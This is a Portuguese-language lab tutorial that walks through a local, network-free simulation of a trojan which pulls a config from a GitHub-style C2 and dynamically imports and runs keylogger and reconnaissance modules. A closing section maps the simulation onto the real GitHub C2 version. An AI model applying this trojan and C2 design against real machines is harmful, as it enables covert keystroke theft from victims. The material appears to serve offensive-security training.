# Guia Prático Iniciante: Juntando o Keylogger com o C2

**Laboratório Prático:** BHT Lab Local (pastas simulam o GitHub)
**Ambiente de Testes:** Python 3 puro (sem token, sem rede)
**Código de Apoio:** `integracao_simples.py`

---

> ⚠️ **Aviso de Responsabilidade e Ética Profissional**
> As técnicas demonstradas neste material têm como finalidade exclusiva o aprendizado de segurança defensiva e testes autorizados em ambiente de laboratório.
> Aqui simulamos `push`/`pull` com pastas locais. O GitHub real só entra na versão completa, com repo privado e token de teste.
> Qualquer execução contra sistemas de terceiros sem autorização prévia por escrito é ilegal, nos termos do **Marco Civil da Internet (Lei nº 12.965/2014)** e do **Artigo 154-A do Código Penal Brasileiro**.

---

## 1. A Arquitetura em 3 Atores (Versão Guardanapo)

O trojan do Cap. 7 é um **carregador**: ele não tem keylogger dentro — ele busca fora.

```text
+-----------------+         +------------------+         +-----------------+
|  ATACANTE (Kali)|         |  GITHUB (pastas) |         |  VÍTIMA (Win)   |
|                 | push    |  config/abc.json |  baixa  |  git_trojan.py  |
|  git push ------+-------->|  modules/*.py    +<--------+  lê config e    |
|  escreve tarefas|         |  data/abc/*.txt  |  envia  |  executa run()  |
|  git pull <-----+---------|  resultados      +<--------+  salva log      |
|  lê resultados  |         |                  |         |                 |
+-----------------+         +------------------+         +-----------------+
```

1. **Atacante:** Escreve `abc.json` + `keylogger.py` e "sobe" (aqui: copia para pastas).
2. **GitHub (simulado):** São 3 pastas locais: `github_simulado/config/`, `github_simulado/modules/`, `github_simulado/data/abc/`.
3. **Vítima (simulada):** O `integracao_simples.py` baixa o JSON, importa cada módulo da pasta e salva o retorno em `data/abc/`.

> 💡 **Para "instalar" o keylogger você NÃO copia para a vítima.**
> Você coloca no GitHub + adiciona `"keylogger"` ao JSON. O trojan faz o resto no próximo ciclo.

---

## 2. O Passo a Passo Simplificado (7 passos viram 3)

| Passo real (completo) | Passo simples (aqui) | O que aprende |
| :--- | :--- | :--- |
| 1. Criar token + `.gitignore` | Pular (sem token) | Higiene vem depois |
| 2. Adaptar `run()` + corrigir `thread_time` | Ver `run(**args)` com `input()` | Padrão de módulo |
| 3. Editar `abc.json` com 3 módulos | Editar `github_simulado/config/abc.json` | Config remota |
| 4. `git push` | Rodar `integracao_simples.py` modo `push` | Publicar tarefa |
| 5. Rodar `git_trojan.py` na vítima | Rodar modo `pull+exec` | Import dinâmico |
| 6. `git pull` + `base64 -d` | Abrir `github_simulado/data/abc/*.txt` | Coleta |

---

## 3. Conceitos de Python Utilizados no Código

### A. Simular `push`/`pull` com `shutil.copy`
Em vez de rede, copiamos arquivos entre pastas:
```python
import shutil
shutil.copy("meu_keylogger.py", "github_simulado/modules/keylogger_simples.py")
```

### B. Reutilizar o `importlib` do Módulo 01
O mesmo truque: nome do JSON vira import:
```python
mod = importlib.import_module(f"github_simulado.modules.{nome}")
log = mod.run()
```

### C. Nomes com `datetime.isoformat()` Seguro para Arquivo
`:` não pode em arquivo Windows, então trocamos:
```python
carimbo = datetime.now().isoformat().replace(":", "-")
```

---

## 4. Análise Linha a Linha do Código

```python
 1 | import importlib
 2 | import json
 3 | import shutil
 4 | from datetime import datetime
 5 | from pathlib import Path
 6 |
 7 | # 1. Pastas que fingem ser o GitHub
 8 | BASE = Path("github_simulado")
 9 | (BASE / "config").mkdir(parents=True, exist_ok=True)
10 | (BASE / "modules").mkdir(parents=True, exist_ok=True)
11 | (BASE / "data" / "abc").mkdir(parents=True, exist_ok=True)
12 |
13 | # 2. PUSH: publica config com 3 módulos
14 | config = [{"module": "dirlister_simples"}, {"module": "environment_simples"}, {"module": "keylogger_simples"}]
15 | (BASE / "config" / "abc.json").write_text(json.dumps(config, indent=2), encoding="utf-8")
16 | print("[push] abc.json publicado com 3 módulos.")
17 |
18 | # 3. PULL: vítima baixa o config
19 | tarefas = json.loads((BASE / "config" / "abc.json").read_text(encoding="utf-8"))
20 | print(f"[pull] Tarefas recebidas: {[t['module'] for t in tarefas]}")
21 |
22 | # 4. EXEC: importa e roda cada módulo
23 | for t in tarefas:
24 |     nome = t["module"]
25 |     print(f"[*] Attempting to retrieve {nome}")
26 |     mod = importlib.import_module(f"github_simulado.modules.{nome}")
27 |     resultado = mod.run()
28 |     carimbo = datetime.now().isoformat().replace(":", "-")
29 |     destino = BASE / "data" / "abc" / f"{carimbo}.txt"
30 |     destino.write_text(str(resultado)[:2000], encoding="utf-8")
31 |     print(f"[+] Resultado de '{nome}' salvo em: {destino}")
32 |
33 | print("Integração simulada concluída. Abra github_simulado/data/abc/")
```

| Linhas | Instrução | Finalidade Técnica |
| :---: | :--- | :--- |
| `8–11` | `mkdir(...)` | Cria `config/`, `modules/`, `data/abc/` locais. |
| `14–16` | `write_text(json.dumps...)` | Simula `git push` do `abc.json` com 3 módulos. |
| `19–20` | `read_text + json.loads` | Simula `get_config()` baixando + decodificando. |
| `25` | `print Attempting to retrieve` | Mesmo log do `GitImporter` real. |
| `26–27` | `import_module + run()` | Import dinâmico + entry-point padrão. |
| `28–31` | `isoformat + write_text` | Simula `store_module_result` (`.data` em base64 no real). |

---

## 5. Procedimento de Execução no Terminal

1. Garanta que `github_simulado/modules/` tem os 3 módulos (copie do módulo 01 + 02 ou crie `keylogger_simples.py` simplificado).
2. Execute:
   ```bash
   python integracao_simples.py
   ```
3. **Saída esperada:**
   ```text
   [push] abc.json publicado com 3 módulos.
   [pull] Tarefas recebidas: ['dirlister_simples', 'environment_simples', 'keylogger_simples']
   [*] Attempting to retrieve dirlister_simples
   [*] In dirlister_simples module.
   [+] Resultado de 'dirlister_simples' salvo em: github_simulado/data/abc/2026-09-24T01-32-11.txt
   [*] Attempting to retrieve environment_simples
   [*] Attempting to retrieve keylogger_simples
   [+] Resultado de 'keylogger_simples' salvo em: github_simulado/data/abc/2026-09-24T01-32-15.txt
   Integração simulada concluída. Abra github_simulado/data/abc/
   ```

> 📌 **Ponte para a versão completa:**
> Troque `github_simulado/` por `bhtprojan/` no GitHub, `write_text` por `create_file`, `read_text` por `file_contents + b64decode`, e `import_module` local por `GitImporter` (`find_spec`/`exec_module`). O fluxo push → pull → exec → coleta é o mesmo.
